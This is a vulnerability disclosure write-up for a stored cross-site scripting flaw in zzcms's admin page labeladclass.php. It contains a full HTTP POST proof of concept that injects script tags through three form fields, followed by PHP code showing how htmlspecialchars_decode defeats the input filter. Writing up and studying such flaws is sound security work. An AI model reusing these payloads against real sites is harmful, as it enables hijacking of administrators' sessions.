### /admin/labeladclass.php exists stored xss

**Vulnerability Process**

Visit /admin/labeladclass.php

![image-20240826193938485](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240826193938485.png)

Then enter the parameters

**POC**

```java
POST /admin/labeladclass.php?action=add HTTP/1.1
Host: zzcms:8786
Content-Length: 258
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://zzcms:8786
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: 	text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://zzcms:8786/admin/labeladclass.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: tablename=zzcms_zhaoshangclass; askclassid=0; PHPSESSID=4pj41bdnhl1msnbrl2lljv1iqm; __51cke__=; xywpwx_bakusername=admin; xywpwx_snsjjssbdvqm=aca496e77ae7ceff46c2f8e72f4235d5; qebak_efourcheck=be67da7f3e3c39cd439799a20c67f8b4; XDEBUG_SESSION=PHPSTORM; xywpwx_bakrnd=zPwzzERUvdP4; xywpwx_loginebakckpass=03269d863bac377ff8cfb81722e356e3; xywpwx_baklogintime=1724589372; PassWord=4297f44b13955235245b2497399d7a93; UserName=aaaa; userid=1; __tins__713776=%7B%22sid%22%3A%201724603456590%2C%20%22vd%22%3A%206%2C%20%22expires%22%3A%201724605579607%7D; __51laig__=34
Connection: keep-alive

title=1&title_old=&bigclassid=empty&numbers=1&column=1&start=</textarea><script>alert(1)</script><textarea>&mids=</textarea><script>alert(2)</script><textarea>&ends=</textarea><script>alert(3)</script><textarea>&Submit=%E6%B7%BB%E5%8A%A0%2F%E4%BF%AE%E6%94%B9
```

The default is 1.txt then click on 1.txt

![image-20240826175222468](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240826175222468.png)

![image-20240826194020547](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240826194020547.png)

Can pop up 1, 2, 3

This means that xss exists at all three points

Code Analysis

in the labeladclass.php

Actually, there is a global filter for our xss.

But here the incoming parameter is passed through the stripfxg function

```java
$start=stripfxg($_POST["start"],true);
$mids=stripfxg($_POST["mids"],true);
$ends=stripfxg($_POST["ends"],true);
```

看到stripfxg函数

```java
function stripfxg($string,$htmlspecialchars_decode=false,$nl2br=false) {//去反斜杠 
$string=stripslashes($string);//去反斜杠,不开get_magic_quotes_gpc 的情况下，在stopsqlin中都加上了，这里要去了
if ($htmlspecialchars_decode==true){
$string=htmlspecialchars_decode($string,ENT_QUOTES);//转html实体符号
}
if ($nl2br==true){
$string=nl2br($string);
}
return $string; 
}
```

You can see that the htmlspecialchars_decode function is used to decode our input, resulting in no filtering of xss.

Then after the

```java
    <tr> 
      <td align="right" class="border" >解释（开始）</td>
      <td class="border" ><textarea name="start" cols="70" rows="10" id="start" ><?php echo $start?></textarea></td>
    </tr>
    <tr> 
      <td align="right" class="border" >解释（循环）</td>
      <td class="border" ><textarea name="mids" cols="70" rows="5" id="mids" ><?php echo $mids ?></textarea>      </td>
    </tr>
    <tr> 
      <td align="right" class="border" >解释（结束）</td>
      <td class="border" ><textarea name="ends" cols="70" rows="20" id="ends"><?php echo $ends ?></textarea></td>
    </tr>
```

Again, we entered our parameters into the page
